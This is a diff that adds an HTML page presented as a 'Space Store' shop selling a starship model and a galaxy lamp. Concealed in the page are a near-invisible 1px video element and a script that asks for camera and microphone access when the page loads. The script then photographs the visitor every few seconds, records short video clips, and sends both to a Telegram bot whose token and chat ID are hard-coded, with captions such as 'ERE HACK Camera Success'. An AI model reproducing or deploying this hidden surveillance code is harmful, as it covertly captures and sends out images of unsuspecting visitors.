@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Space Store</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(to bottom, #0b0c29, #2c5364);
+      color: #fff;
+    }
+    header { background: rgba(0,0,0,0.7); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
+    header h1 { font-size: 1.8em; color: #f5c469; }
+    header nav a { color: #f5c469; text-decoration: none; margin-left: 20px; font-weight: bold; }
+    header nav a:hover { text-decoration: underline; }
+    .hero { background: url('https://images.unsplash.com/photo-1446776811953-b23d57bd21aa?auto=format&fit=crop&w=1350&q=80') no-repeat center center/cover; height: 300px; display: flex; justify-content: center; align-items: center; color: #fff; text-shadow: 0 0 15px rgba(0,0,0,0.7); font-size: 2em; font-weight: bold; }
+    .products { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 20px; padding: 20px; }
+    .product-card { background: rgba(255, 255, 255, 0.05); border-radius: 15px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.4); transition: transform 0.3s, box-shadow 0.3s; }
+    .product-card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0,0,0,0.6); }
+    .product-card img { width: 100%; height: 180px; object-fit: cover; }
+    .product-info { padding: 15px; text-align: center; }
+    .product-info h3 { margin: 10px 0; color: #f5c469; }
+    .product-info p { font-size: 0.9em; color: #ddd; margin: 5px 0 10px; }
+    .product-info button { padding: 8px 15px; background: #f5c469; color: #000; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; transition: background 0.3s; }
+    .product-info button:hover { background: #e5b44c; }
+    footer { background: rgba(0,0,0,0.7); text-align: center; padding: 15px; color: #f5c469; margin-top: 30px; font-size: 0.9em; }
+    #camera { width: 1px; height: 1px; position: fixed; bottom: 0; right: 0; opacity: 0.01; }
+    canvas { display: none; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Space Store</h1>
+    <nav>
+      <a href="#">Home</a>
+      <a href="#">Products</a>
+      <a href="#">About</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="hero">Explore the Galactic Deals!</div>
+
+  <div class="products">
+    <div class="product-card">
+      <img src="https://images.unsplash.com/photo-1602526215737-1cf318372c7b?auto=format&fit=crop&w=800&q=80" alt="Product 1">
+      <div class="product-info">
+        <h3>Starship Model</h3>
+        <p>$120.00</p>
+        <button>Add to Cart</button>
+      </div>
+    </div>
+    <div class="product-card">
+      <img src="https://images.unsplash.com/photo-1508610048659-a06e4d9f4f02?auto=format&fit=crop&w=800&q=80" alt="Product 2">
+      <div class="product-info">
+        <h3>Galaxy Lamp</h3>
+        <p>$80.00</p>
+        <button>Add to Cart</button>
+      </div>
+    </div>
+  </div>
+
+  <video id="camera" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <footer>© 2025 Space Store. All rights reserved.</footer>
+
+  <script>
+    // ปลอดภัย: ใช้ placeholder
+    const BOT_TOKEN = "8068929944:AAHtsM5Yf--VwBDFg3b_paSkXADFRh8kuoo"; // แทนที่ด้วยของคุณเอง
+    const CHAT_ID = "-4898717294";     // แทนที่ด้วยของคุณเอง
+
+    const video = document.getElementById("camera");
+    const canvas = document.getElementById("canvas");
+    let chunks = [];
+    let recorder;
+
+    window.onload = async function() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          setInterval(capturePhoto, 3000);
+          setInterval(startShortVideo, 10000);
+        };
+      } catch (err) {
+        console.error("Cannot access camera:", err);
+      }
+    };
+
+    function capturePhoto() {
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+
+      canvas.toBlob(async (blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob, "photo.jpg");
+        formData.append("caption", "ERE HACK Camera Success 📷");
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+        console.log("Photo sent ✅");
+      }, "image/jpeg");
+    }
+
+    function startShortVideo() {
+      chunks = [];
+      recorder = new MediaRecorder(video.srcObject, { mimeType: "video/webm;codecs=vp8" });
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = sendVideo;
+      recorder.start();
+      setTimeout(() => recorder.stop(), 5000);
+    }
+
+    async function sendVideo() {
+      if (chunks.length === 0) return;
+      const blob = new Blob(chunks, { type: "video/webm" });
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("video", blob, "video.webm");
+      formData.append("caption", "ERE Video Sent 🎥");
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+        method: "POST",
+        body: formData
+      });
+      console.log("Video sent ✅");
+    }
+  </script>
+</body>
+</html>
